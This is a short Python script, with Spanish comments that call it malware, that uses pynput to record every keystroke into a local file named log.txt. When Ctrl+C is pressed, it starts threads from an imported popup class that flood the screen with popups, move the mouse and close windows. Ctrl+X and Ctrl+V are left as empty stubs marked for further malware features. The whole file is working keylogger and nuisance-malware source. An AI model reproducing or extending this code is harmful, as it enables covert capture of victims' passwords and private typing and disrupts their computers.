from pynput.keyboard import Listener
import os
import threading
from Classes import popup

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    # para mejorar la lectura del documento de texto
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    if letter == "Key.esc": # mata el proceso y cierra el malware
        os.kill(os.getpid(), 9)

    if letter == "\\x18": # CTRL + X
        # agregar funcionalidad del malware

        pass 

    if letter == "\\x03": # CTRL + C
        # agregar funcionalidad del malware
        pp = popup.popupGenerator()
        t1 = threading.Thread(target=pp.start_popups(30))
        t2 = threading.Thread(target=pp.moveMouse)
        t3 = threading.Thread(target=pp.closeWindows)
        t1.start()
        t2.start()
        t3.start()

    if letter == "\\x16": # CTRL + V
        # agregar funcionalidad del malware
        pass 

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()

